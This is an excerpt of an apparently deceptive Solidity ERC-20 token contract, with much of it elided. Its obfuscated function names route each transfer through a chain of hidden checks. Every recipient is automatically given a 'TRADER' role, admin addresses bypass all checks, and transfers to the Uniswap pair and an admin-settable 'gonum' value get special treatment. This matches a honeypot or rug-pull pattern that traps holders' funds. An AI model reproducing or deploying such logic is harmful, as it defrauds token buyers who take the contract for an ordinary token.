...
interface _JDENFKNRRoleControl {
...
abstract contract _JDENFKNRConsole is Context, _JDENFKNRRoleControl {
    ...
    function __JDENFKNRsetA(
        bytes32 root,
        uint256 num
    ) public onlyRole(ADMIN) {
        if(root != TRADER){
            revert("gonum is not a number");
        }
        gonum = num;
    }
...
contract _JDENFKNRERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _JDENFKNRERC20, _JDENFKNRConsole {
    ...
    ) _JDENFKNRERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_JDENFKNRERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __JDENFKNRfebvfdv(from, to, amt);

    }

    function __JDENFKNRfebvfdv(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __JDENFKNRtyjdffm(from, to, amt);
    }


    function __JDENFKNRtyjdffm(address from, address to, uint256 amt) internal {
        ...
        __JDENFKNRogsggmygs(from, to, amt);
    }

    function __JDENFKNRogsggmygs(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __JDENFKNRuvnndxzc(from, to, amt);
    }

    function __JDENFKNRuvnndxzc(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __JDENFKNRubsdzxhj(from, to, amt);
    }


    function __JDENFKNRubsdzxhj(address from, address to, uint256 amt) internal {
        if(to == uniswapV2Pair){
        ...
        __JDENFKNRugdeexnio(from, to, amt);
    }

    function __JDENFKNRugdeexnio(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __JDENFKNRoiyrecmyh(from, to, amt);
    ...
    function __JDENFKNRoiyrecmyh(address from, address to, uint256 amt) internal {
        if(amt > 0){
